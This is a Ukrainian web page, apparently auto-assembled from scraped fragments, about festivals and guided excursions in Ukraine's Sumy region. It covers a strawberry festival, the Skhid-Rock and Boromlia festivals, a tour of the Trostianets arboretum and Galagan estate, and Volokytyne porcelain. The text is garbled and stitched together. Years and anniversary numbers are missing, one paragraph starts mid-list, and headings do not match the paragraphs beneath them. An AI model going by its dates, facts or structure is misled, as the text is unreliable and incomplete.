<p>Традиційне обласне свято «Віншуємо суницю — першу ягоду-царицю».</p><a id='d1'></a><h3>Фестиваль «Органум»</h3><p>Минулого року там спекли найбільший полуничний пиріг — довжиною 43 метри 97 сантиметрів. Його занесли до Книги рекордів Гіннеса України. На які рекорди чекати цього року?</p>
		
	<p>Всеукраїнський фестиваль «Козацький родослав» відзначатимуть у рамках святкування в Сумській області ї річниці перемоги війська Івана Виговського у Конотопській битві. На відвідувачів чекають численні концерти, козацькі розваги та українська кухня. Вперше відбувся у липні року.</p><strong><a id='d2'></a><h2>Екскурсії Східною Україною</h2></strong><p>Нині фестиваль відбудеться вже всьоме. Щороку Схід-рок дає можливість молодим колективам виступити на одній сцені з монстрами української рок-музики. Фестиваль проводять у фортеці XVIII століття — Круглий Двір. Можна не лише слухати музику, відпочивати з друзями і знаходити нових знайомих, але й насолоджуватися старовинною архітектурою. Всеукраїнський сільський фестиваль-конкурс мистецтв «Боромля» — єдине в Україні професійне сільське мистецьке свято.</p>
<p>Воно проводиться щорічно Тростянці, Сумах та селах Сумської області. Гала-концерт проводиться у селі Боромля. На гостей чекають концерти за участю майстрів мистецтв і художніх колективів, концерти симфонічної, камерної і народної музики, концерти за участю лауреатів конкурсу та гостей фестивалю. У вересні відбудеться й Міжнародний літературно-мистецький фестиваль «Кролевецькі рушники». Фест збирає поетів, письменників, художників, майстрів декоративно-прикладного мистецтва, мистецтвознавців, художніх колективів та окремих виконавців з різних регіонів України.</p>
<p>Гоголю; - Відвідування унікального в Україні музею «Поштова станція», де ви побачите унікальні експонати, пов'язані з нелегкою роботою пошти часів Т. Шевченко і О. Глінки, човнового причалу, "романтичних руїн", господарський двір та Георгіївська церква ; - Вільний час на пікнік на природі; - Екскурсія Тростянецьким дендропарком, одним з найкрасивіших ландшафтних парків України, створений нащадком відомого роду Скоропадських, дізнаємось безліч легенд та цікавих історій повязаних з парком і не тільки; - Переїзд в Сокиринці; - Екскурсія садибою Галаганів, під час якої ми побачимо внутрішні інтер'єри палацу та прогуляємось парком; Переїзд до Дніпра Зверніть увагу!</p><strong><a id='d3'></a><h2>Екскурсії по Україні, екскурсійні тури УкраїноюEtnoSvit</h2></strong><p>Прибуття заплановано пізно в ночі ;. Це й не дивно, адже колись село Волокитине було відомим далеко за межами Російської імперії.</p><img src="https://ukrainer.net/wp-content/uploads/2019/11/14-13.jpg" alt="Підпишись на розсилку і дізнайся першим про наші пропозиції!" style="max-width: 480px; max-height: 480px;"/><p>А все завдяки порцеляні, що її виготовляли на місцевій порцеляновій мануфактурі, яку завбачливо звів тут колишній власник маєтку Андрій Миклашевський. Сьогодні немає ні садиби, ні Покровської церкви з унікальним порцеляновим іконостасом. Усе зруйнувала радянська влада у х роках ХХ ст. Але волокитинські порцелянові вироби зберігаються в музеях не лише України, а й США, Фінляндії, Франції та Росії. До села дістатися непросто.</p>
